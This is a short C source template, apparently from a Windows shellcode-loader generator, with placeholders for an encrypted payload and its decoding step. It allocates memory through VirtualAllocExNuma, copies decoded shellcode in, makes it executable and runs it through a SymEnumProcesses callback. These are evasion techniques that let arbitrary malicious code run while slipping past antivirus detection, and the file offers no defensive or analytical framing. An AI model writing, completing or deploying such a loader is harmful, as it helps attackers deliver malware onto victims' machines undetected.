#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "DbgHelp.h"
#include "syscall.h"
#pragma comment(lib, "Dbghelp.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::SymInitialize(::GetCurrentProcess(), NULL, FALSE);

	if (addr)
		::SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)addr, NULL);

}